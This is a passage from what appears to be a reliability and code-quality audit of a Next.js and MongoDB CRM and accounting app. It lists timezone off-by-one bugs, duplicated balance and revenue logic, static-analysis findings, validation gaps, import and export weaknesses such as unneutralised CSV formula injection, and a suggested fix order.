- `reports/page.tsx:29-37` has its own `dateRange` with `T23:59:59` and **no Z** (server-local). That is the same as UTC on Vercel but differs on a Dubai dev machine, so local testing won't reproduce production.
- `components/shared/DateRangePicker.tsx:62` `new Date(from)` parses as UTC midnight and reads local month. Harmless at UTC+4, wrong for negative offsets (P4).
- `DatePicker.tsx` uses local `fmt`. Correct for the Dubai user, but its "Today" button (`:233`) is correct while the page defaults (REL-16) are not.

Concrete off-by-one list:
- Auto-payment from an enrollment at 00:00-03:59 Dubai: `datePaid` and the receipt JE date fall on the previous day, possibly the previous month or VAT quarter (`enrollments/route.ts:206,213`).
- The invoice JE uses `registrationDate` (instant) (`enrollments/route.ts:181`). Same effect, and the lock date may be tripped (REL-12).
- Class session with no `classDate` sent (`class-sessions/route.ts:130`): trainer "classes today" (`my/students/route.ts:31-39`) uses a UTC day too, so the two are consistent with each other but wrong for Dubai.
- Follow-up "today/overdue" views (`follow-ups/route.ts:58-73`) and the dashboard "today" tiles (`dashboard/page.tsx:76-77,123,126,190`) use the UTC day.
- Reports and Finance "this month" and the monthly chart use UTC months (`reports/page.tsx:44-45`, `finance/page.tsx:55,91,102`).
- Payroll period (`lib/payroll.ts:87-88`) is fine for date-only class dates and wrong for defaulted instants.
- Reversal JE date `new Date()` (`engine.ts:193`) lands on the previous day if reversed 00:00-03:59 Dubai.
- Client defaults (REL-16): 14 sites.

---

## 4. Duplicated business logic (section 9)

- **Outstanding / balance due**
  - `lib/serializers.ts:118`: clamped at 0.
  - `app/api/collections/route.ts:37`: unclamped, excludes Dropped.
  - `reports/page.tsx:120`: sums negatives, all statuses.
  - `reports/page.tsx:139`: top 25.
  - `finance/page.tsx:129`: Active only.
  - `dashboard/page.tsx:146`: certificates-due rule.
  - `enrollments/page.tsx:304`: client sum of `balanceDue`.
  - The accounting Receivables page (`accounting/receivables/route.ts:36-50`) uses the ledger. That makes **four different outstanding numbers**.
- **Revenue**
  - `payments/route.ts:48`: excludes Refund.
  - `dashboard/page.tsx:166-174`: includes Refund.
  - `reports/page.tsx:92-107,124-136`: excludes Refund. `:114-118` (by method) includes it.
  - `reports/export/route.ts:21,30-38`: includes Refund.
  - `finance/page.tsx:72,85`: ledger accrual. `:87-120` cash payments.
  - `dashboard/page.tsx:221`: `Enrollment.amountPaid`.
  - `accounting/dashboard/route.ts:45-48`: ledger.
- **Date-range parsing**: `buildDateFilter` (`dateRange.ts:106`), `reports/page.tsx:29`, `setDate(+1) $lt` in payments, enrollments, expenses, leads, follow-ups and attendance, and inline in the ledger and trial-balance routes.
- **`derivePaymentType`**: `enrollments/route.ts:15`, `enrollments/[id]/route.ts:15`, `admin/backfill-payments/route.ts:8`. The third version differs: no "Instalment 2 of 2".
- **`round2`**: redefined in 9 files (engine, postings, payroll, hours, collections, receivables, trial-balance, vat-report, accounting dashboard, journal `[id]`).
- **VAT split**
  - Inclusive: `expenses/route.ts:72-74`, `expenses/[id]/route.ts:82-85`, `postings.ts:90`.
  - Exclusive with a different rounding: `supplier-bills/route.ts:54` (`Math.round(x*rate)/100`).
- **Sales ownership**: regex on display name in `leads/route.ts:86-90`, `follow-ups/route.ts:33-36`, `leads/export/route.ts:38-41`, `dashboard/page.tsx:87-92`, `search/route.ts:66-69`. Lowercase string compare in `leads/[id]/route.ts:99-106` and `follow-ups/[id]/route.ts:20-30`. Keyed on `name`, so renaming a user changes what they can access.
- **Trainer scope**
  - `lib/teacher.ts` `taughtByFilter` (teacherId or teacherIds).
  - `dashboard/page.tsx:100` and `search/route.ts:45` use `teacherId` only, so co-teachers get 0 or no results.
  - `attendance/route.ts:44` and `attendance/[id]/route.ts:24` match on the `trainerName` string.
- **Hours**: `hours.ts` `sessionCharges` and `payroll.ts` `sessionPaysTeacher` are intentionally different. The completion guard (`enrollments/[id]/route.ts:136-143`) relies on the stored `completedHours`, which is fine only as long as recalculation always runs.

---

## 5. Static analysis (section 8)

- TODO/FIXME/HACK: **0**. The only `XXX` hits are phone placeholders in `settings/page.tsx`.
- `: any` / `as any` / `<any>`: **54** across 16 files.
  - `lib/serializers.ts`: 29. Every serializer takes `any`, so model/serializer drift is invisible (REL-35).
  - `app/api/teachers/route.ts` and `[id]`: 7 `as any` on enum `includes`.
  - `app/api/attendance/*`: 3, where records are mapped from untyped bodies (no validation).
  - `app/api/enrollment-requests/*`: 2.
  - `components/finance/FinanceCharts.tsx`: 3.
  - Four pages cast the session: `(session?.user as any)?.role`.
- `@ts-ignore` / `@ts-expect-error`: **0**.
- `eslint-disable`: **10**.
  - `react-hooks/exhaustive-deps` ×4: `accounting/journal/page.tsx:237`, `NotificationPanel.tsx:141,149`, `LeadsClient.tsx:362`. These carry stale-closure risk. `follow-ups/page.tsx:184` also omits `loadFollowUps` from deps without a disable comment.
  - File-wide `no-explicit-any` in `FinanceCharts.tsx:23`.
  - `leads/export/route.ts:34`.
  - `no-img-element` ×3.
  - `no-var` in `db.ts`.
- `as never` escapes the type system in money paths: `postings.ts:187,217`, `payments/route.ts:119`, `payments/[id]/route.ts:120`, `enrollments/*:222,240`, `expenses/*`, `teacher-payouts/route.ts:29,86,175`, `engine.ts:218`.
- Toolchain: `eslint-config-next` 15.1.3 against `next` 16.2.6.
- Tests: `tests/accounting/{engine,postings,payroll,coa-seed}`, `tests/crm/{lead-conversion,teacher-scope}`, `tests/utils/csv`, `tests/styles/cascade`. None cover route handlers, concurrency, the payment/expense edit repost path (REL-01/02 would have been caught), timezone, or import.

---

## 6. Frontend data pipeline (section 4) — verification

- There is no React Query, Zod or RHF. Most dashboard pages are `"use client"` and fetch in `useEffect`/`useCallback`. `dashboard`, `finance` and `reports` are server components that query Mongo directly, with no caching and no revalidation after mutations.
- Double submit: primary forms disable their buttons while saving. That doesn't cover cross-tab use or retries after a network timeout, and the server has no idempotency (REL-24). Journal row actions share one `actioning` flag per tab.
- Validation contradictions between client and server:
  - Receipts client requires name and amount > 0; the server does the same but accepts NaN/Infinity strings (REL-21).
  - Import client "required" = first two template columns (payments: studentName and studentPhone), while the server requires studentName and amount.
  - Payments DELETE is admin-only but the UI offers it to manager and finance (REL-23).
  - Leads PATCH strips `assignedTo` for sales, while generic import lets sales set it (`import/[entity]:114`).
- Malformed ObjectIds: `[id]` routes validate `isValid` and return 400 (good). Body-embedded ids (`enrollmentId`, `leadId`, `notifications ids`, `teacherIds` in POST `enrollments/route.ts:135` is filtered) return a leaked CastError 400 or an unhandled 500.

## 7. Serialization (section 5) — see REL-35.

## 8. Import/Export (section 6) — see REL-15, REL-28, REL-29, REL-32, REL-40.
- Formula injection: confirmed (no neutralisation in `csvEscape` or Papa).
- Row validation: enum fields silently coerce invalid values to defaults (e.g. invalid `stage` becomes "Lead", invalid `paymentMethod` becomes "Cash" in `import/[entity]:73-75,237-239`) instead of failing the row. `leads/import` does reject.
- Duplicates: leads (exact phone), enrollments (phone and course), teachers (phone) are checked per row with read-then-create. Payments, expenses, follow-ups and classes have no check.
- Partial import: always; no transaction or batch id.
- Size limits: 500 rows on generic import only. Leads CSV and JV import have no limit (the Vercel 4.5 MB body limit is the only cap).
- Preview: client-side row count and 2-field check only. No server dry run.
- Financial rows imported blindly: **yes** (REL-15).

## 9. Transactions / DB (section 3)
- `lib/db.ts` caches the connection on `globalThis` (good) but caches rejected promises (REL-11) and sets no pool or timeout options.
- The deployment appears to be Atlas (`auth.ts:65` error text), so it is a replica set and multi-document transactions are available (S: tier not verified). The code uses none.
- Counter (`models/Counter.ts`) is atomic `$inc`+upsert, but numbers are consumed outside any transaction (REL-37).

## 10. Suggested fix order
1. REL-01/02 (one-line `$unset` fix plus regression tests), REL-03, REL-11.
2. A `withTransaction` helper, then REL-04/05/07/09/10/14 using it. Add `postingStatus` (REL-08).
3. `todayDubai` / `dubaiRange` helpers, then REL-12/16/17/18.
4. `apiFetch`, `toApiError`, Zod schemas, then REL-20/21/23/26/27.
5. Awaited, structured audit with the missing calls (REL-13).
6. Import/export hardening (REL-15/28/29), then performance (REL-32-34).
